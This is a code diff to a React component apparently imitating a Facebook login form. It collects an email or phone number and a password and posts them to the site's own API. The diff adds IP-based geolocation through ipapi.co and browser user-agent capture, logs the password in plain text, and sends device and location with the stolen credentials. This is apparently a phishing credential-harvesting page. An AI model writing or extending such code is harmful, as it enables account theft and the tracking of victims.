@@ -8,13 +8,29 @@ export default function Facebook() {
   const [password, setPassword] = useState('');
   const router = useRouter();
 
+  const getLocationViaIP = async () => {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    return `${data.city}, ${data.region}, ${data.country_name}`;
+  } catch (err) {
+    console.warn("Failed to get location:", err);
+    return "Unknown";
+  }
+};
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+     const device = navigator.userAgent;
+     const location = await getLocationViaIP();
+     console.log(emailOrPhone, password, device, location);
+     console.log("User Agent:", navigator.userAgent);
+
 
     const res = await fetch('/api/Facebook', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ emailOrPhone, password }),
+      body: JSON.stringify({ emailOrPhone, password, device, location }),
     });
 
     const data = await res.json();
